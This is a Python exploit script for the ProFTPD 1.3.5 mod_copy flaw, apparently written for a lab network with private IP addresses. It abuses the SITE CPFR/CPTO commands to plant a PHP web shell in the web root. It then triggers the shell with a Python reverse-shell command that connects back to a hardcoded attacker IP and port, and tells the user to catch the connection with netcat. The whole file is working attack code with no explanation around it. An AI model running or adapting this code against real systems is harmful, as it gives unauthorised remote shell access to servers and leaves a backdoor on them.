import socket, sys, requests, random

#
#   ProFTP 1.3.5 mod_copy Exploit
#

ftp_port = 21
rhost = "192.168.229.105"
tmp_path = b"/tmp"
site_path = b"/var/www"
php_file = b"anything.php"
atk_IP = "192.168.229.2"
atk_port = "9001"
revshell_cmd = "python -c 'import os, socket;" \
    "s=socket.socket();s.connect((\"" \
    + atk_IP + "\"," + atk_port + "));" \
    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"\
    "os.dup2(s.fileno(),2);os.system(\"/bin/bash\")'"


def check():
    print("[*] Check if Target is Vulnerable")
    try:
        with socket.socket() as s:
            s.connect((rhost, ftp_port))
            banner = s.recv(4096).decode('ascii')
            if "ProFTPD 1.3.5 Server" in " ".join(banner.split()[1:4]):
                s.send(b"SITE CPFR /etc/passwd\n")
                tmp = s.recv(1024)
                if "350" in tmp.decode('ascii'):
                    print("[+] Target is vulnerable")
                else:
                    print("[!] Target is not vulnerable")
            else:
                print("[!] Target is not running ProFTP 1.3.5")
    except ConnectionRefusedError as e:
        print("[!] Port " + ftp_port + " is not open")


def exploit():
    try:
        with socket.socket() as s:
            s.connect((rhost, ftp_port))
            if "220" in s.recv(4096).decode('ascii'):
                print("[+] Connected to FTP server")
                print("[+] Sending copy commands to FTP server")
                s.send(b'SITE CPFR /proc/self/cmdline\n')
                tmp = s.recv(4096).decode('ascii')
                if "350" not in tmp:
                    print("[!] Failure copying from /proc/self/cmdline\n")
                else:
                    s.send(b"SITE CPTO " + tmp_path + b"/<?php system($_GET['c']) ?>\n")
                    tmp = s.recv(4096).decode('ascii')
                    if "250" not in tmp:
                        print("[!] Failure copying to temporary payload file")
                    else:
                        s.send(b"SITE CPFR " + tmp_path + b"/<?php system($_GET['c']) ?>\n")
                        tmp = s.recv(4096).decode('ascii')
                        if "350" not in tmp:
                            print("[!] Failure copying from temporary payload file")
                        else:
                            s.send(b"SITE CPTO " + site_path + b"/html/" + php_file + b"\n")
                            tmp = s.recv(4096).decode('ascii')
                            if "250" not in tmp:
                                print("[!] Failure copying PHP payload to website path, directory not writable?")
                            else:
                                print("[+] Executing PHP payload http://" + rhost + "/" + php_file.decode('ascii') + " with revshell_cmd")
                                r = requests.get("http://" + rhost + "/" + php_file.decode('ascii'), params={'c': revshell_cmd})
                                if r.status_code != 200:
                                    print("[!] Failure executing payload")
                                else:
                                    print("[+] Payload executed successfully")
    except Exception as e:
        print(e)


print("*"*30)
print("ProFTP 1.3.5 mod_copy Exploit")
print("*"*30 )
print("use nc -nlvp " + atk_port + " to catch" + "\n")
#check()
exploit()
